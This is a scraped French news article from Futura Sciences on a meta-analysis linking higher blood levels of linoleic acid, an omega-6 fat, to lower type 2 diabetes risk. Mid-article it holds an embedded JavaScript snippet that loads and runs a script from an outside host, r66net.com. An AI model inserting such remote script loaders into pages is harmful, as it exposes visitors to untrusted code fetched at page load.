{"title": "Des oméga-6 contre le diabète de type 2 ?", "newspaper": "Futura Sciences", "author": "Marie-Céline Jacquier", "date_publi": "12/10/2017", "content": "Les acides gras oméga-6 présents dans les huiles végétales comme le tournesol aideraient à prévenir le diabète de type 2. Pourtant, précédemment, des travaux ont suggéré qu'ils étaient nocifs pour la santé. Ce qu'il faut retenir L'acide linoléique est un oméga-6 présent dans des huiles végétales. Dans une étude sur près de 40.000 adultes vivant dans dix pays, ceux qui en avaient le plus réduisaient leur risque de diabète de 35 %. L'impact des oméga-6 sur la santé est controversé. Alors dangereux ou pas les  oméga-6  ? Ces  acides gras  présents certaines huiles végétales sont, tout comme les  oméga-3 , des  acides gras polyinsaturés , mais leurs conséquences sur la santé sont assez discutées. Cette nouvelle étude parue dans  The Lancet Diabetes & Endocrinology  semble les réhabiliter... Dans cet article, les chercheurs ont analysé les données de 20 études impliquant 39.740 adultes. Les participants, âgés de 49 à 76 ans, n'avaient pas de  diabète  au départ de l'étude et ils provenaient de 10 pays différents : Allemagne, Australie, États-Unis, Finlande, France, Islande, Pays-Bas, Royaume-Uni, Suède et Taïwan. Les chercheurs ont relevé les niveaux d' acide linoléique  et d'acide arachidonique dans le sang des participants, entre 1970 et 2010. Au cours du suivi, 4.347 nouveaux cas de  diabète  sont apparus. Le saviez-vous ? Les acides linoléique et arachidonique sont des acides gras oméga-6. L’acide linoléique est présent dans les huiles de tournesol, soja, noix, pépins de raisin. Dans la famille des acides gras oméga-3 se trouvent par exemple l'acide docosahexaénoique (DHA) et l'acide éicosapentaénoïque (EPA).  Dariush Mozaffarian, de l'université Tufts (Massachusetts), a précisé dans un  communiqué de presse  que  « les personnes impliquées dans l'étude étaient généralement en bonne santé et n'ont pas reçu de conseils spécifiques sur ce qu'il fallait manger ». En France, plus de trois millions de personnes sont diabétiques. © Kwangmoo, Fotolia                               Une alimentation riche en acide linoléique semble protéger du diabète Résultats : les personnes dont les niveaux d'acide linoléique dans le sang étaient les plus élevés réduisaient de 35 % leur risque de développer un  diabète de type 2 , par rapport à ceux qui avaient le moins d'acide linoléique. En revanche, l'acide arachidonique n'était pas associé au risque de diabète, ni dans un sens ni dans l'autre : il ne semblait ni nocif ni bénéfique.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Selon  Jason  Wu, principal auteur de ces travaux,  « nos résultats suggèrent qu'un simple changement dans le  régime alimentaire  pourrait protéger les gens du développement d'un diabète de type 2 ».  Or, cette maladie touche de plus en plus de personnes dans le monde. D'après l' OMS , 422 millions de personnes étaient  diabétiques  en 2014 dans le monde. Cependant, des études ont suggéré que les acides gras oméga-6 auraient des effets négatifs sur la santé, contrairement aux acides gras  oméga-3 . Voir aussi : L’obésité favorisée par trop d'oméga-6 La force de cette étude tient au grand nombre de participants et au fait qu'elle rassemble les résultats de différentes recherches dans le monde. Mais comme elle combine les résultats d'études d'observation, elle ne permet pas de prouver de lien de cause à effet. La gastronomie moléculaire et ses applications renversantes                       La gastronomie moléculaire correspond à une discipline scientifique. Son objectif : démêler les mécanismes liés aux phénomènes culinaires. Hervé This, physicien et chimiste français, co-inventeur de la gastronomie moléculaire, nous présente, en vidéo, deux exemples d’applications de cette gastronomie un peu particulière.                                       ", "theme": "sante"}